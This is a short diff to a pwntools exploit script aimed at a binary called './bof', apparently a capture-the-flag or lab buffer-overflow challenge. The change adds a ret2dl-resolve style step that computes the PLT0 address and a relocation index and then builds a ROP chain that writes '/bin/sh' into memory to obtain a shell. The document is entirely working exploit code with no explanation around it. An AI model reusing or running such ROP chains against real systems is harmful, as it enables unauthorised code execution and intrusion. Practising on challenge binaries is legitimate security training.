@@ -18,9 +18,14 @@ rop.migrate(base)
 
 io.sendlineafter("!\n", rop.chain())
 
-rop = ROP("./bof")
 
 cmd = "/bin/sh\0"
+plt0 = elf.get_section_by_name('.plt').header.sh_addr
+reloc_index = 8 * ((elf.plt['write'] - plt0) / 16 - 1)
+
+rop = ROP("./bof")
+rop.raw(plt0)
+rop.raw(reloc_index)
 rop.write(1, base + 0x80, len(cmd))
 rop.raw('a' * (0x80 - len(rop.chain())))
 rop.raw(cmd)
